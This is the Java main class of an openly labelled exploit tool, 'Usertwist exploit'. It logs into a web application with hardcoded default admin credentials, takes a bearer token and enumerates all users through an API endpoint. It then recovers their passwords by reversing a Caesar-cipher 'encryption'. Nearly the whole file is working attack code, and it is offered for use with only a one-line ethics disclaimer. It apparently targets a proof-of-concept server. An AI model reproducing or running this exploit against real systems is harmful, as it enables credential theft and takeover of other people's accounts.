package fr.motysten.usertwist.exploit;

import fr.motysten.usertwist.exploit.tools.Parser;
import fr.motysten.usertwist.exploit.tools.Request;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.net.ssl.SSLException;
import javax.net.ssl.SSLHandshakeException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.http.HttpResponse;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static String link = "https://poc.athelas.fr";
    public static String username = "admin";
    public static String password = "AdminSecret1C";
    public static String port = "443";
    public static int rotation = 4;
    public static boolean insecure = false;
    public static boolean asynchronous = true;

    public static void main(String[] args) throws IOException, InterruptedException, NoSuchAlgorithmException, KeyManagementException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        if (Arrays.asList(args).contains("--synchronous") || Arrays.asList(args).contains("-s")) {
            asynchronous = false;
        }

        System.out.println("Usertwist exploit by Motysten");
        System.out.println("Please don't use for unethical purpose !\n");
        String readLine;

        System.out.println("Please enter the URL to attack (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {link = readLine;}

        System.out.println("Please enter the port of the remote web server (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {port = readLine;}

        System.out.println("Please enter the used username (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {username = readLine;}

        System.out.println("Please enter the password (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {password = readLine;}

        System.out.println("Please enter the cesar offset (leave empty to use default) :");
        readLine = reader.readLine();
        if (!readLine.isEmpty()) {rotation = Integer.parseInt(readLine);}

        JSONObject requestJSON = new JSONObject();
        requestJSON.put("username", username);
        requestJSON.put("password", password);

        System.out.println("Gathering Bearer token...");

        HttpResponse<String> response = null;

        boolean tokenFound = false;
        while (!tokenFound) {
            try {
                response = Request.get(link, port, "/login", requestJSON, null, insecure);
                if (response.statusCode() == 308) {
                    System.err.println("The server is trying to force HTTPS use. Would you like to retry with HTTPS ? [Y/n]");
                    if (reader.readLine().equalsIgnoreCase("n")) {
                        System.err.println("Operation aborted ! Security failure.");
                    } else {
                        link = link.replaceFirst("http", "https");
                        port = "443";
                    }
                } else {
                    tokenFound = true;
                }
            } catch (SSLHandshakeException e) {
                System.err.println("Remote server certificate issuer couldn't be verified. Someone could be spying on your network.");
                System.err.println("Would you like to continue anyway ? [y/N]");
                if (!reader.readLine().equalsIgnoreCase("y")) {
                    System.err.println("Operation aborted ! Security failure.");
                    System.exit(1);
                } else {
                    insecure = true;
                }
            } catch (SSLException e) {
                if (e.getMessage().contains("plaintext connection?")) {
                    System.err.println("Looks like you're trying to send an HTTPS request on HTTP port. Would you like to switch on port 443 ? [Y/n]");
                    if (reader.readLine().equalsIgnoreCase("n")) {
                        System.err.println("Operation aborted !");
                        System.exit(1);
                    } else {
                        port = "443";
                    }
                }
            }
        }

        if (response.statusCode() == 401) {
            System.err.println("Invalid credentials ! Please try again (defaults credentials could help)");
            System.exit(1);
        }

        System.out.println(response.statusCode());

        JSONObject responseObject = new JSONObject(response.body());
        String token = responseObject.optString("token");

        System.out.println("Token found: " + token);

        requestJSON = new JSONObject();
        requestJSON.put("term", "");
        requestJSON.put("entity", "users");

        System.out.println("\nScanning for existing users...");

        Map<String, String> headers = new HashMap<>();
        headers.put("Authorization", "Bearer " + token);

        response = Request.get(link, port, "/references", requestJSON, headers, insecure);
        JSONArray usersArray = new JSONArray(response.body());

        System.out.println(usersArray.length() + " users found !");
        System.out.println("\nDecrypting passwords...\n");

        if (asynchronous) {
            float startTime = System.nanoTime();
            Parser.asyncGetPass(usersArray, rotation);
            float elapsedTime = (System.nanoTime() - startTime) / 1000000;
            System.out.println("Synchronous elapsed time = " + elapsedTime + "ms");
        } else {
            float startTime = System.nanoTime();
            Parser.getPass(usersArray, rotation);
            float elapsedTime = (System.nanoTime() - startTime) / 1000000;
            System.out.println("Synchronous elapsed time = " + elapsedTime + "ms");
        }

    }

}
